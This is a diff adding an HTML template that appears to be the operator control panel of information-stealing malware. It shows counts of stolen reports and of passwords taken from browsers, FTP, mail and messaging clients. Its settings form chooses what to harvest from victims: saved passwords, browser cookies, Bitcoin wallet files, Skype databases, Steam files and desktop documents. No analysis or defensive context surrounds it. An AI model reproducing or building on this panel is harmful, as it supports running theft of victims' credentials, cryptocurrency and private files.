@@ -1,0 +1,59 @@
+<div class="info-text1">
+				<center>Main Page</center>
+</div>
+
+<div class="info-text1">
+<table>
+<tr>
+Stats<br>
+<td><img src="img/st.png"></td>
+<td style="color: white;"><pre>
+All report:		%all_rep_c%
+	Today:		%rep_today_c%
+	
+All passwords:		%pwds_c%
+	Browsers:	%br_pwds_c%
+	FTP clients:	%ftp_pwds_c%
+	Mail clients:	%mail_pwds_c%
+	IM:		%msg_pwds_c%
+</pre></td>	
+</tr>
+</table>
+<form method="POST">
+	<input type="hidden" name="clear_database" value="1">	
+	<input type="submit" value="Delete all" class="sbutton" onclick="return confirm('Are you sure?')">
+</form>
+</div>
+
+
+
+		<div class="info-text1">
+		<table>
+		<tr>
+		Config<br>
+			<td><img src="img/cfg.png"></td>
+			<td>
+			<form method="POST">
+			<table class="config-table">
+				<input type="hidden" name="wtf" value="setconfig"><br>
+				<tr><td>Repeated reports:</td>				<td><input type="checkbox" name="IS_G_DOUBLE" value="1" %IS_G_DOUBLEchecked%></td></tr>
+				<tr><td>Saved passwords:</td>			<td><input type="checkbox" name="IS_G_PWDS" 	value="1" %IS_G_PWDSchecked%></td></tr>
+				<tr><td>Cookies and autocomplete browsers:</td>				<td><input type="checkbox" name="IS_G_BROWSERS" value="1" %IS_G_BROWSERSchecked%></td></tr>
+				<tr><td>Bitcoin clients files:</td>								<td><input type="checkbox" name="IS_G_COINS" 	value="1" %IS_G_COINSchecked%></td></tr>
+				<tr><td>Skype db:</td>								<td><input type="checkbox" name="IS_G_SKYPE" 	value="1" %IS_G_SKYPEchecked%></td></tr>
+				<tr><td>Steam files:</td>									<td><input type="checkbox" name="IS_G_STEAM" 	value="1" %IS_G_STEAMchecked%></td></tr>
+				<tr><td>Desktop files:</td>						<td><input type="checkbox" name="IS_G_DESKTOP" 	value="1" %IS_G_DESKTOPchecked%></td></tr>
+				<tr><td>Desktop files[extensions]:</td>			<td><input type="text" class="edit" name="G_DESKTOP_EXTS" value="%G_DESKTOP_EXTS%"></td></tr>
+				<tr><td>Desktop files[MAX FileSize kb]:</td><td><input type="text" class="edit" name="G_DESKTOP_MAXSIZE" value="%G_DESKTOP_MAXSIZE%"></td></tr>
+
+			</table>
+			<br><input type="submit" value="Save" class="sbutton">
+			</form>
+			</td>
+		</tr>
+		</table>		
+		</div>
+	
+
+	
+			
